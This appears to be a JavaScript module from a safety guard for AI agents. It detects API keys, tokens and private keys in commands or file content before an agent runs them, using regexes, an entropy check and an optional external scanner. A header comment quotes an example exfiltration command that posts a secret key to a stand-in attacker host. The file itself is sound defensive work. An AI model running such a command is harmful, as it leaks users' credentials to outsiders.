// ==============================================================================
// Program: secrets.mjs
// Programmer: Ethan-da-Tech-Wizard
// Last Modified: November 18, 2026
// Purpose: Pattern-based secret detector identifying exposed tokens and private keys
// ==============================================================================
// Secret scanning: built-in regexes, plus git-secret-shield when ASHR_SECRET_SHIELD is set.
// scanSecretsSync: regexes and entropy only. scanSecrets: async, adds the external tool.
//
// How it fits: guard/rules.mjs scans the text an agent is about to run or write (a Bash command, or
//   file content for Write/Edit) and turns any hit into a HIGH-risk reason, so a command like
//   `curl -d sk-... evil.com` or a file containing a private key is never auto-allowed.
// Two layers: (1) built-in regexes for well-known token formats plus a high-entropy heuristic, always
//   on and offline; (2) the optional external git-secret-shield tool, enabled only when the
//   ASHR_SECRET_SHIELD environment variable points at it. If layer 2 is configured but cannot give
//   an answer, the result is the SCAN_FAILED label (MEDIUM), so a broken scanner means "ask the
//   human", not "allow".
// Privacy: scanning is local. The only external process is the optional tool, run on a private temp
//   file that is always deleted. Nothing is sent over the network.
// Known limits: regexes miss secrets in unknown formats and low-entropy passwords.
// Test: test/guard-secrets.test.mjs.
import { execFile } from 'node:child_process';
import { existsSync } from 'node:fs';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { basename, dirname, join } from 'node:path';

// Sentinel label: an external scanner was configured but returned no verdict.
// Exported so rules.mjs and bash.mjs can recognise it and treat it as MEDIUM instead of HIGH.
export const SCAN_FAILED = 'secret scan failed';

// Well-known credential formats: AWS access key IDs, "sk-" API keys, GitHub tokens, PEM private key headers.
const PATTERNS = [
  ['AWS access key', /\bAKIA[0-9A-Z]{16}\b/],
  ['API key (sk-)', /\bsk-[A-Za-z0-9_-]{20,}/],
  ['GitHub token', /\bgh[pousr]_[A-Za-z0-9]{30,}/],
  ['private key', /-----BEGIN (?:[A-Z]+ )?PRIVATE KEY-----/],
];

// Shannon entropy in bits per character; random secrets score high, prose and identifiers low.
/**
 * @param {string} s - non-empty token.
 * @returns {number} Shannon entropy in bits per character, H = -sum(p * log2(p)) over the
 *   character frequencies p. Random base64 is about 5-6; English text about 4 or less.
 */
function entropy(s) {
  const counts = new Map();
  for (const c of s) counts.set(c, (counts.get(c) || 0) + 1);
  let h = 0;
  for (const n of counts.values()) h -= (n / s.length) * Math.log2(n / s.length);
  return h;
}

// Heuristic for unknown secret formats: a 32+ char token with digits, lower and upper case and entropy > 4.2.
// Requiring all three character classes keeps ordinary hashes-in-words and long identifiers from tripping it.
/**
 * @param {string} text - text to inspect.
 * @returns {boolean} true if any 32+ character run of token characters looks random. The 4.2
 *   threshold sits between ordinary long identifiers and real keys.
 */
function highEntropyToken(text) {
  for (const tok of text.match(/[A-Za-z0-9_\-+=]{32,}/g) || []) {
    if (/\d/.test(tok) && /[a-z]/.test(tok) && /[A-Z]/.test(tok) && entropy(tok) > 4.2) return true;
  }
  return false;
}

// git-secret-shield (a Python tool) has no stdin mode. Its real CLI is
//   python3 -m secretshield scan <file|dir> --fail-on-findings
// Exit 0 = clean, 1 = findings (only with --fail-on-findings), 2 = bad path.
// ASHR_SECRET_SHIELD points at the repo root (the folder holding secretshield/)
// or at any file inside the secretshield/ package, e.g. .../secretshield/cli.py.
/**
 * @returns {string|null} directory to run `python3 -m secretshield` from, or null when the
 *   env var is unset or does not point at a real secretshield package.
 */
function shieldRoot() {
  const p = process.env.ASHR_SECRET_SHIELD;
  if (!p) return null;
  if (existsSync(join(p, 'secretshield', '__main__.py'))) return p;
  const pkg = dirname(p);
  if (basename(pkg) === 'secretshield' && existsSync(join(pkg, '__main__.py'))) return dirname(pkg);
  return null;
}

// Run the external scanner on one file. Maps exit codes to 'clean' / 'found'; anything else is 'failed'. 3 s timeout.
/**
 * @param {string} root - working directory containing the secretshield package.
 * @param {string} file - path of the file to scan.
 * @returns {Promise<'clean'|'found'|'failed'>} never rejects; 'failed' covers a missing python,
 *   a timeout and any unexpected exit code.
 */
function run(root, file) {
  return new Promise((resolve) => {
    execFile('python3', ['-m', 'secretshield', 'scan', file, '--fail-on-findings'], {
      cwd: root, timeout: 3000,
    }, (err) => {
      if (!err) resolve('clean');
      else if (err.code === 1) resolve('found');
      else resolve('failed'); // missing python, timeout, crash, bad path: no verdict
    });
  });
}

// The scanner has no stdin mode, so write the text to a private (0600) temp file, scan it, and always delete it.
/**
 * @param {string} text - content to scan.
 * @param {string} root - from shieldRoot().
 * @returns {Promise<'clean'|'found'|'failed'>} temp-dir errors also give 'failed'.
 */
async function shieldVerdict(text, root) {
  let dir;
  try {
    dir = await mkdtemp(join(tmpdir(), 'ashr-scan-'));
    const file = join(dir, 'input.txt');
    await writeFile(file, text, { mode: 0o600 });
    return await run(root, file);
  } catch {
    return 'failed';
  } finally {
    if (dir) await rm(dir, { recursive: true, force: true }).catch(() => {});
  }
}

// Labels for findings. Empty list means clean.
/**
 * @param {unknown} text - text to scan; non-strings and empty text are clean.
 * @returns {string[]} human-readable labels such as 'AWS access key'; [] means no finding.
 */
export function scanSecretsSync(text) {
  if (!text || typeof text !== 'string') return [];
  const found = PATTERNS.filter(([, re]) => re.test(text)).map(([name]) => name);
  if (!found.length && highEntropyToken(text)) found.push('high-entropy token');
  return found;
}

// Same, plus the external tool. A configured tool with no verdict yields SCAN_FAILED.
// Cheap built-in checks run first; the slower subprocess only runs when they found nothing.
/**
 * @param {unknown} text - text to scan.
 * @returns {Promise<string[]>} labels; may include SCAN_FAILED. Never rejects.
 */
export async function scanSecrets(text) {
  const found = scanSecretsSync(text);
  if (found.length || !text || typeof text !== 'string') return found;
  const root = shieldRoot();
  if (!root) return found;
  const v = await shieldVerdict(text, root);
  if (v === 'found') found.push('git-secret-shield hit');
  else if (v === 'failed') found.push(SCAN_FAILED);
  return found;
}
